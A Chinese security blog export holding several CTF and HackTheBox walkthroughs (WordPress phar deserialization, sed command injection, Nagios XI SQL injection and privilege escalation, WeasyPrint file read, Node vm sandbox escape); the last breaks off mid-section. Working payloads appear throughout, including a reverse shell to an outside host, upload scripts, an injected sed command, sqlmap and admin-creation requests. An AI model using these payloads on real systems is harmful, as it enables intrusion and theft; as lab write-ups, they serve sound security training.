<p>我们看一下如何实现，<code>&amp;&amp;</code>运算符只要第一个为假表达式即为假，所以目的是让<code>is_remote_file</code>为假</p>
<p>看向下面这段代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( strpos( $file, home_url() ) !== false ) &#123;</span><br><span class="line">	$is_remote_file = false;</span><br><span class="line">&#125;		        		</span><br><span class="line">          </span><br><span class="line">if ( preg_match( &#x27;#http://#&#x27;, $file ) || preg_match( &#x27;#https://#&#x27;, $file ) ) &#123;</span><br><span class="line">    $formatted_path = &#x27;url&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$formatted_path = &#x27;filepath&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $is_remote_file ) &#123;</span><br><span class="line">	$formatted_path = &#x27;url&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个 if 语句检查 $file 变量中<code>home_url()</code>的出现，其中file变量是dl参数的值，<code>home_url</code>是 WordPress 安装的完整 URL。</p>
<p>如果dl参数具有 WordPress 路径的 URL，则<code>is_remote_file</code>的值将为false。</p>
<p>也就是说我们可以通过file等协议读取文件，并添加有效的url路径，例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://http://xxx.com/index.php</span><br></pre></td></tr></table></figure>

<p>最后再base64编码一下即可</p>
<p>我们已经分析完怎么文件读取，结合hint5那么接下来就是如何上传phar文件</p>
<p>根据关键词和版本信息找到插件drag-and-drop-multiple-file-upload-contact-form-7具有XSS漏洞（本质是可以未授权上传图片）</p>
<p><a href="https://wpscan.com/vulnerability/1b849957-eaca-47ea-8f84-23a3a98cc8de/">参考文章</a></p>
<blockquote>
<p>至于为什么思路是上传phar文件，我们结合前文分析的漏洞可以知道用协议去读取文件，当然包括phar协议</p>
</blockquote>
<p><img src="/article/NCTF2023/image-20231229143821345.png"></p>
<p>这篇文章直接就给了POC，大概意思就是在<code>/wp-admin/admin-ajax.php</code>路径进行文件上传，我们把该poc中的xss内容换成我们phar文件内容即可</p>
<p>那么我们先生成用来RCE的phar文件，直接用工具phpggc生成反弹shell文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./phpggc WordPress/RCE2 system &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/5i781963p2.yicp.fun/58265 0&gt;&amp;1&#x27;&quot; -p phar -o ~/payload.phar</span><br></pre></td></tr></table></figure>

<p>在题目访问<code>/wp-admin/admin-ajax.php</code>抓包</p>
<p>将poc复制上去，修改下文件名为4.jpg以及文件内容为phar（右键从文件粘贴）</p>
<p><img src="/article/NCTF2023/image-20231229201808140.png"></p>
<p>测试后发现也能弹shell，不会出现二进制数据格式错误</p>
<p>当然也可以用python脚本上传文件（按照poc改的）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://124.71.184.68:8012/wp-admin/admin-ajax.php&#x27;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;Accept&#x27;: &#x27;application/json, text/javascript, */*; q=0.01&#x27;,</span><br><span class="line">    &#x27;Accept-Language&#x27;: &#x27;en-GB,en;q=0.5&#x27;,</span><br><span class="line">    &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span><br><span class="line">    &#x27;X-Requested-With&#x27;: &#x27;XMLHttpRequest&#x27;,</span><br><span class="line">    &#x27;Connection&#x27;: &#x27;close&#x27;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">    &#x27;size_limit&#x27;: (None, &#x27;10485760&#x27;),</span><br><span class="line">    &#x27;action&#x27;: (None, &#x27;dnd_codedropz_upload&#x27;),</span><br><span class="line">    &#x27;type&#x27;: (None, &#x27;click&#x27;),</span><br><span class="line">    &#x27;upload-file&#x27;: (&#x27;1.jpg&#x27;, open(&#x27;payload.phar&#x27;, &#x27;rb&#x27;), &#x27;image/jpeg&#x27;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, headers=headers, files=files)</span><br><span class="line"></span><br><span class="line">print(response.status_code)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<p>成功上传</p>
<p><img src="/article/NCTF2023/image-20231229201102713.png"></p>
<p>然后就是文件读取，将payload编码一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phar:///var/www/html/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/1.jpg/test.txt</span><br></pre></td></tr></table></figure>

<p>注意phar url的结尾必须加上 <code>/test.txt</code> ,因为在构造phar文件的时候执行的是 <code>$phar-addFromString(&quot;test.txt&quot;, &quot;test&quot;);</code> ,这里的路径需要与代码中的test.txt对应,否则网站会⼀直卡住</p>
<p>访问<code>/index.php/video</code>并传递参数dl去phar读取文件</p>
<p><img src="/article/NCTF2023/image-20231229201131924.png"></p>
<p>成功反弹shell</p>
<p><img src="/article/NCTF2023/image-20231229201213786.png"></p>
<p>尝试suid提权，发现可用命令</p>
<p><img src="/article/NCTF2023/image-20231229201305498.png"></p>
<p>查找一下date命令如何提权</p>
<p><img src="/article/NCTF2023/image-20231229201648495.png"></p>
<p>得到flag</p>
<p><img src="/article/NCTF2023/image-20231229201621224.png"></p>
<h2 id="Webshell-Generator"><a href="#Webshell-Generator" class="headerlink" title="Webshell Generator"></a>Webshell Generator</h2><blockquote>
<p>考点：sed命令</p>
</blockquote>
<p>打开题目，大概意思就是可以生成webshell并下载下来<br><img src="/article/NCTF2023/image-20240401201433227.png"></p>
<p>hint1给了附件，直接代码审计<br>index.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function security_validate()</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($_POST as $key =&gt; $value) &#123;</span><br><span class="line">        if (preg_match(&#x27;/\r|\n/&#x27;, $value)) &#123;</span><br><span class="line">            die(&quot;$key 不能包含换行符！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (strlen($value) &gt; 114) &#123;</span><br><span class="line">            die(&quot;$key 不能超过114个字符！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">security_validate();</span><br><span class="line">if (@$_POST[&#x27;method&#x27;] &amp;&amp; @$_POST[&#x27;key&#x27;] &amp;&amp; @$_POST[&#x27;filename&#x27;]) &#123;</span><br><span class="line">    if ($_POST[&#x27;language&#x27;] !== &#x27;PHP&#x27;) &#123;</span><br><span class="line">        die(&quot;PHP是最好的语言&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $method = $_POST[&#x27;method&#x27;];</span><br><span class="line">    $key = $_POST[&#x27;key&#x27;];</span><br><span class="line">    putenv(&quot;METHOD=$method&quot;) or die(&quot;你的method太复杂了！&quot;);</span><br><span class="line">    putenv(&quot;KEY=$key&quot;) or die(&quot;你的key太复杂了！&quot;);</span><br><span class="line">    $status_code = -1;</span><br><span class="line">    $filename = shell_exec(&quot;sh generate.sh&quot;);</span><br><span class="line">    if (!$filename) &#123;</span><br><span class="line">        die(&quot;生成失败了！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = trim($filename);</span><br><span class="line">    header(&quot;Location: download.php?file=$filename&amp;filename=&#123;$_POST[&#x27;filename&#x27;]&#125;&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>POST传参接收三个参数，如果参数language不为php，那么分别设置环境变量METHOD和KEY，执行generate.sh文件并赋值给filename，然后跳转到download.php进行文件下载</p>
<p>我们可以抓包看一下<br><img src="/article/NCTF2023/image-20240401201504690.png"></p>
<p>当我们直接访问的话可以读取到该生成的文件<br>也就是说存在任意文件读取</p>
<p><img src="/article/NCTF2023/image-20240401201553160.png"></p>
<p>根据hint提示我们要读取<code>/readflag</code>，我们分析一下如何读取<br>按照刚刚的测试，读取的文件路径是由<code>$filename = shell_exec(&quot;sh generate.sh&quot;);</code>决定，那么我们跟进一下<br>generate.sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">set -e</span><br><span class="line"></span><br><span class="line">NEW_FILENAME=$(tr -dc a-z0-9 &lt;/dev/urandom | head -c 16)</span><br><span class="line">cp template.php &quot;/tmp/$NEW_FILENAME&quot;</span><br><span class="line">cd /tmp</span><br><span class="line"></span><br><span class="line">sed -i &quot;s/KEY/$KEY/g&quot; &quot;$NEW_FILENAME&quot;</span><br><span class="line">sed -i &quot;s/METHOD/$METHOD/g&quot; &quot;$NEW_FILENAME&quot;</span><br><span class="line"></span><br><span class="line">realpath &quot;$NEW_FILENAME&quot;</span><br></pre></td></tr></table></figure>
<p>可以发现是使用sed命令的<code>-i</code>参数，我们查找下</p>
<p><img src="/article/NCTF2023/image-20240401201614723.png"></p>
<p>可以编辑文件内容，而<code>s/KEY/$KEY/g</code> 是 sed 命令的替换操作部分<br>也就是说生成的webshell中会替换两个值<br><img src="/article/NCTF2023/image-20240401201639360.png"></p>
<p>sed命令中可以用<code>;</code>来分隔指令，e参数用来命令执行<br>我们在参数key的地方注入，前后闭合即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/g;e /readflag;s/</span><br></pre></td></tr></table></figure>
<p>至于为什么是e而不是-e，解释如下</p>
<blockquote>
<p>GNU sed中的sed -i s&#x2F;hello&#x2F;g;e &#x2F;readflag命令中的e参数是用来执行一个外部命令的。在这个命令中，e参数后面跟着的是一个外部命令&#x2F;readflag，它会被sed执行在sed命令中，-e参数用于指定一个或多个sed脚本命令，而-i参数用于直接修改文件内容。因此，我们想要在sed命令中执行一个外部命令，我们需要使用e参数而不是-e参数</p>
</blockquote>
<p><img src="/article/NCTF2023/image-20240401201711511.png"></p>
<p>然后再访问得到flag</p>
<p><img src="/article/NCTF2023/image-20240401201729069.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>比赛</tag>
      </tags>
  </entry>
  <entry>
    <title>Monitored-HackTheBox</title>
    <url>/article/Monitored-HackTheBox.html</url>
    <content><![CDATA[<p>snmp协议</p>
<span id="more"></span>

<h1 id="Monitored-HackTheBox"><a href="#Monitored-HackTheBox" class="headerlink" title="Monitored-HackTheBox"></a>Monitored-HackTheBox</h1><p><strong>信息搜集</strong></p>
<p>nmap扫描一下端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.248</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE    SERVICE  VERSION</span><br><span class="line">22/tcp   open     ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span><br><span class="line">80/tcp   open     http     Apache httpd 2.4.56</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET</span><br><span class="line">|_http-title: Did not follow redirect to https://nagios.monitored.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.56 (Debian)</span><br><span class="line">84/tcp   filtered ctf</span><br><span class="line">389/tcp  open     ldap     OpenLDAP 2.2.X - 2.3.X</span><br><span class="line">443/tcp  open     ssl/http Apache httpd 2.4.56 ((Debian))</span><br></pre></td></tr></table></figure>

<p>注意到80端口跳转到<code>https://nagios.monitored.htb/</code>且无法访问，我们试试添加到<code>/etc/hosts</code>成功访问</p>
<p>继续访问发现是登陆界面</p>
<p><img src="/article/Monitored-HackTheBox/image-20240403182522547.png"></p>
<p>然后就没有什么收获了，参考国外师傅wp是要进行 udp 扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sV -sC -v -sU 10.10.11.248</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT    STATE         SERVICE  VERSION</span><br><span class="line">68/udp  open|filtered dhcpc</span><br><span class="line">123/udp open          ntp      NTP v4 (unsynchronized)</span><br><span class="line">161/udp open          snmp     SNMPv1 server; net-snmp SNMPv3 server (public)</span><br><span class="line">162/udp open|filtered snmptrap</span><br></pre></td></tr></table></figure>

<p>注意到161端口为snmp协议，我们先简单了解下两个概念</p>
<p><strong>SNMP</strong></p>
<blockquote>
<p>SNMP是一种标准的网络管理协议，它允许管理员监控和管理网络设备，例如路由器、交换机、服务器等。它有三个版本分别是<code>1，c2，3</code>，主要区别在于操作类型和安全性。</p>
</blockquote>
<p><strong>管理信息库MIB</strong></p>
<blockquote>
<p>任何一个被管理的资源都表示成一个对象，称为被管理的对象。MIB是被管理对象的集合。它定义了被管理对象的一系列属性：对象的名称、对象的访问权限和对象的数据类型等。</p>
</blockquote>
<p>MIB文件中的变量使用的名字取自ISO和ITU管理的对象标识符（object identifier）名字空间。它是一种分级树的结构。如下图所示，第一级有三个节点：ccitt、iso、iso-ccitt。低级的对象ID分别由相关组织分配。一个特定对象的标识符可通过由根到该对象的路径获得，一般网络设备取iso节点下的对象内容。</p>
<p>如名字空间ip结点下一个名字为ipInReceives的MIB变量被指派数字值3，那么该变量名为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iso.org.dod.internet.mgmt.mib.ip.ipInReceives</span><br></pre></td></tr></table></figure>

<p>相应的数字表示（对象标识符OID，唯一标识一个MIB对象）为<code>1.3.6.1.2.1.4.3</code></p>
<p><img src="/article/Monitored-HackTheBox/image-20240403192944296.png"></p>
<p>回到题目，用snmpwalk进行扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmpwalk -v 1 -c public 10.10.11.248 1.3.6.1.2.1.25</span><br></pre></td></tr></table></figure>

<p>注：这里版本应该都能扫出来</p>
<p>​		<code>public</code>为团体名，是一种简单的身份验证机制</p>
<p>​		<code>1.3.6.1.2.1.25</code>为对象标识符OID(收集所有系统信息)</p>
<p><img src="/article/Monitored-HackTheBox/image-20240403194127846.png"></p>
<p>得到用户登录信息<code>svc:XjH7VCehowpR1xZB</code></p>
<p><img src="/article/Monitored-HackTheBox/image-20240403193352038.png"></p>
<p>不过登陆失败</p>
<p><img src="/article/Monitored-HackTheBox/image-20240403194504872.png"></p>
<p>我们扫一下目录发现路径<code>/nagios</code>，访问一下有登录框</p>
<p><img src="/article/Monitored-HackTheBox/image-20240403200058890.png"></p>
<p>成功登录</p>
<p><img src="/article/Monitored-HackTheBox/image-20240403200301691.png"></p>
<p>获得信息Nagios xi版本为4.4.13，找到相关漏洞</p>
<p><img src="/article/Monitored-HackTheBox/image-20240403202017508.png"></p>
<p>我们可以用sqlmap去注入数据库得到admin的api信息 <a href="https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567">参考文章</a></p>
<p>当然在文章中我们注意到成功需要知道cookie值</p>
<p><img src="/article/Monitored-HackTheBox/image-20240403202147750.png"></p>
<p>我们通过对<code>/nagiosxi</code>不断深度扫描，最终得到下面路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://nagios.monitored.htb/nagiosxi/api/v1/authenticate</span><br></pre></td></tr></table></figure>

<p><img src="/article/Monitored-HackTheBox/image-20240403202956326.png"></p>
<p>我们bp抓包修改下请求方式，提交参数为刚刚的用户和密码</p>
<p>得到token值<code>a7eb754b64862d9a0943c405c4d4e2717eea9d51</code></p>
<p><img src="/article/Monitored-HackTheBox/image-20240403203751456.png"></p>
<p>因为这里的token值会变，所以在使用sqlmap的时候用curl命令去获得</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=`curl -ks https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d &quot;username=svc&amp;password=XjH7VCehowpR1xZB&amp;valid_min=500&quot; | awk -F&#x27;&quot;&#x27; &#x27;&#123;print$12&#125;&#x27;`&quot; --level 5 --risk 3 -p id --batch --dbs</span><br></pre></td></tr></table></figure>

<p>得到admin的api后，添加用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k &quot;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1&quot; -d &quot;username=rev1ve&amp;password=rev1ve&amp;name=rev1ve&amp;email=rev1ve@localhost&amp;auth_level=admin&quot;</span><br></pre></td></tr></table></figure>

<p>我们成功用<code>rev1ve:rev1ve</code>登录</p>
<p><img src="/article/Monitored-HackTheBox/image-20240403235458293.png"></p>
<p>然后<code>Configure -&gt; Core Config Manager</code>找到Command，添加反弹shell命令</p>
<p>然后在<code>Monitoring-&gt;Hosts-&gt;localhost</code>中Run一下调用shell</p>
<p><img src="/article/Monitored-HackTheBox/image-20240404000803329.png"></p>
<p>成功反弹shell</p>
<p><img src="/article/Monitored-HackTheBox/image-20240404000838169.png"></p>
<p>得到user的flag</p>
<p><img src="/article/Monitored-HackTheBox/image-20240404000948674.png"></p>
<p>尝试sudo提权</p>
<p><img src="/article/Monitored-HackTheBox/image-20240404001440760.png"></p>
<p>试试<code>manage_services.sh</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh</span><br></pre></td></tr></table></figure>

<p>执行后提示需要有参数，随便加一个status</p>
<p><img src="/article/Monitored-HackTheBox/image-20240404003341695.png"></p>
<p><code>manage_services.sh</code>可以控制服务，注意到npcd文件可控，并且能够以root用户执行npcd服务的开启和关闭，因此可以在npcd服务中加入一段反弹shell来提权</p>
<p>我们先停止npcd服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd</span><br></pre></td></tr></table></figure>

<p><img src="/article/Monitored-HackTheBox/image-20240404003853008.png"></p>
<p>使用wget命令下载我们的npcd文件，赋予权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x npcd</span><br></pre></td></tr></table></figure>

<p><img src="/article/Monitored-HackTheBox/image-20240404002218837.png"></p>
<p>然后开启<code>npcd</code>服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd</span><br></pre></td></tr></table></figure>

<p>成功提权拿到root的flag</p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSRound#20 Basic</title>
    <url>/article/NSSRound-20-Basic.html</url>
    <content><![CDATA[<p>114514</p>
<span id="more"></span>





<h1 id="CSDN-To-PDF-V1-2"><a href="#CSDN-To-PDF-V1-2" class="headerlink" title="CSDN_To_PDF V1.2"></a>CSDN_To_PDF V1.2</h1><p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, jsonify, make_response, render_template, flash, redirect, url_for</span><br><span class="line">import re</span><br><span class="line">from flask_weasyprint import HTML, render_pdf</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">URL_REGEX = re.compile(</span><br><span class="line">    r&#x27;http(s)?://&#x27;  # http or https</span><br><span class="line">    r&#x27;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#x27;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">def is_valid_url(url):</span><br><span class="line">    if not URL_REGEX.match(url):</span><br><span class="line">        return False</span><br><span class="line">    if &quot;blog.csdn.net&quot; not in url:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def CsdnToPdf():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        url = request.form.get(&#x27;url&#x27;)</span><br><span class="line">        # 当我不知道weasyprint会解析恶意 &lt;link attachment=xxx&gt;？</span><br><span class="line">        url = url.replace(&quot;html&quot;, &quot;&quot;)</span><br><span class="line">        if is_valid_url(url):</span><br><span class="line">            try:</span><br><span class="line">                html = HTML(url=url)</span><br><span class="line">                pdf = html.write_pdf()</span><br><span class="line">                response = make_response(pdf)</span><br><span class="line">                response.headers[&#x27;Content-Type&#x27;] = &#x27;application/pdf&#x27;</span><br><span class="line">                response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=output.pdf&#x27;</span><br><span class="line"></span><br><span class="line">                return response</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return f&#x27;Error generating PDF&#x27;, 500</span><br><span class="line">        else:</span><br><span class="line">            return f&#x27;Invalid URL! Target web address: &#x27; + url</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&quot;index.html&quot;), 200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br></pre></td></tr></table></figure>

<p>题目是没有给源码的，我们从题目一步步分析</p>
<p>打开页面，有一个PDF转换器</p>
<p><img src="/article/NSSRound-20-Basic/image-20240401215914318.png"></p>
<p>存在输入URL大概率有SSRF，随便给个vps的发现不行</p>
<p><img src="/article/NSSRound-20-Basic/image-20240401220042448.png"></p>
<p>结合转换器是转换CSDN的，那么路径应该要有CSDN</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net</span><br></pre></td></tr></table></figure>

<p>测试成功，我们在vps上开启监听看看</p>
<p>获得信息<code>WeasyPrint 61.2</code></p>
<p><img src="/article/NSSRound-20-Basic/image-20240401220234808.png"></p>
<p><strong>WeasyPrint</strong></p>
<blockquote>
<p>WeasyPrint是一个用于HTML和CSS的可视化渲染引擎，可以将HTML文档导出为打印标准的PDF文件</p>
</blockquote>
<p>我们可以借助HTML的标签实现文件读取 <a href="https://nahamsec.com/posts/my-expense-report-resulted-in-a-server-side-request-forgery-ssrf-on-lyft">参考文章</a></p>
<p>查看源码可以注意到我们能够使用 <code>&lt;link rel=attachment href=&quot;file:///root/secret.txt&quot;&gt;</code>将任何网页或本地文件的内容附加到我们的 PDF 中</p>
<p><img src="/article/NSSRound-20-Basic/image-20240401221004300.png"></p>
<p>前面已经测试过存在SSRF，那么我们在vps上创建link.html文件然后去读取环境变量即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;link rel=&quot;attachment&quot; href=&quot;file:///proc/1/environ&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>回到题目，注意到源代码有个链接</p>
<p><img src="/article/NSSRound-20-Basic/image-20240401223407178.png"></p>
<p>结合css文件我们可以自己构造如下路径，并在vps上创建<code>blog.csdn.net</code>文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net/link.html</span><br></pre></td></tr></table></figure>

<p>结果不行，我们把<code>blog.csdn.net</code>去掉再读发现html没了（应该是被替换成空）</p>
<p>直接双写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net/link.hthtmlml</span><br></pre></td></tr></table></figure>

<p>得到pdf文件后用binwalk分离一下，得到flag</p>
<p><img src="/article/NSSRound-20-Basic/image-20240401225931026.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>比赛</tag>
      </tags>
  </entry>
  <entry>
    <title>NKCTF2024</title>
    <url>/article/NKCTF2024web%E8%A7%A3%E6%9E%90.html</url>
    <content><![CDATA[<p>CVE-2019-9059、沙箱逃逸、CVE-2024-2044</p>
<span id="more"></span>

<h1 id="NKCTF-2024-web解析"><a href="#NKCTF-2024-web解析" class="headerlink" title="[NKCTF 2024]web解析"></a>[NKCTF 2024]web解析</h1><h2 id="my-first-cms"><a href="#my-first-cms" class="headerlink" title="my first cms"></a>my first cms</h2><p>打开题目在最下面发现是CMS Made Simple，版本为2.2.19</p>
<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093023723.png"></p>
<p>扫一下发现存在后台登陆界面，直接访问</p>
<p>用字典爆破下admin的密码为Admin123</p>
<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093321830.png"></p>
<p>然后直接登录，去漏洞库搜一下其实存在很多漏洞（重点看最近的）</p>
<p>找到CMS Made Simple的RCE漏洞（CVE-2019-9059）<a href="https://www.exploit-db.com/exploits/49345">参考文章</a></p>
<p>步骤如下</p>
<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093554457.png"></p>
<p>登陆后按照上图，保存后去执行代码</p>
<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325092708716.png"></p>
<p>成功反弹shell，得到flag</p>
<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325092809851.png"></p>
<h2 id="全世界最简单的CTF"><a href="#全世界最简单的CTF" class="headerlink" title="全世界最简单的CTF"></a>全世界最简单的CTF</h2><p>扫目录发现存在<code>/secret</code>源码泄露</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const bodyParser = require(&#x27;body-parser&#x27;);</span><br><span class="line">const app = express();</span><br><span class="line">const fs = require(&quot;fs&quot;);</span><br><span class="line">const path = require(&#x27;path&#x27;);</span><br><span class="line">const vm = require(&quot;vm&quot;);</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">.use(bodyParser.json())</span><br><span class="line">.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;))</span><br><span class="line">.use(express.static(path.join(__dirname, &#x27;/public&#x27;)))</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, function (req, res)&#123;</span><br><span class="line">    res.sendFile(__dirname + &#x27;/public/home.html&#x27;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function waf(code) &#123;</span><br><span class="line">    let pattern = /(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g;</span><br><span class="line">    if(code.match(pattern))&#123;</span><br><span class="line">        throw new Error(&quot;what can I say? hacker out!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.post(&#x27;/&#x27;, function (req, res)&#123;</span><br><span class="line">        let code = req.body.code;</span><br><span class="line">        let sandbox = Object.create(null);</span><br><span class="line">        let context = vm.createContext(sandbox);</span><br><span class="line">        try &#123;</span><br><span class="line">            waf(code)</span><br><span class="line">            let result = vm.runInContext(code, context);</span><br><span class="line">            console.log(result);</span><br><span class="line">        &#125; catch (e)&#123;</span><br><span class="line">            console.log(e.message);</span><br><span class="line">            require(&#x27;./hack&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/secret&#x27;, function (req, res)&#123;</span><br><span class="line">    if(process.__filename == null) &#123;</span><br><span class="line">        let content = fs.readFileSync(__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        let content = fs.readFileSync(process.__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.listen(3000, ()=&gt;&#123;</span><br><span class="line">    console.log(&quot;listen on 3000&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>本题是考察如何沙箱逃逸实现RCE，waf过滤很多，process被办意味着我们需要用别的手段去得到process对象，中括号被办就不能利用js特性拼接绕过，<code>\</code>被办意味着不能十六进制或者Unicode绕过。</p>
<h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p><a href="https://ycznkvrmzo.feishu.cn/docx/E92JdQmGxoUwXexnQgpcRaIsn7g">参考LaoGong战队</a></p>
<p>我们注意到源码中的沙箱定义</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let code = req.body.code;</span><br><span class="line">let sandbox = Object.create(null);</span><br><span class="line">let context = vm.createContext(sandbox);</span><br></pre></td></tr></table></figure>

<p>create内为null，并且也没有其他可以引用的对象，这时候想要逃逸我们要用到一个函数中的内置对象的属性arguments.callee.caller，它可以返回函数的调用者。</p>
<p>而一般情况如果没有执行字符串操作或者利用函数重写，我们可以利用Proxy劫持</p>
